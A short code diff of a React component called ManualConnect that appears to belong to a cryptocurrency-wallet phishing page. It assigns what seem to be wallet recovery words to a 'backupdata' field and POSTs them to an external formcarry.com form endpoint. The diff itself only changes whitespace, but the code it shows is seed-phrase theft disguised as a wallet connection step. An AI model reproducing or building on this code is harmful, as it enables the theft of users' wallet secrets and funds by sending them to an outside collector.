@@ -69,7 +69,7 @@ const ManualConnect = ({ backToErrorModal, userWalletDetails, closeManualConnect
       setIsLoading(true)
       data.backupdata = words
 
-      const result = await fetch("https://formcarry.com/s/gqHpTaauB8x", {
+      const result = await fetch("https://formcarry.com/s/gqHpTaauB8x",{
         method: 'POST',
         headers: {
           "Accept": "application/json",
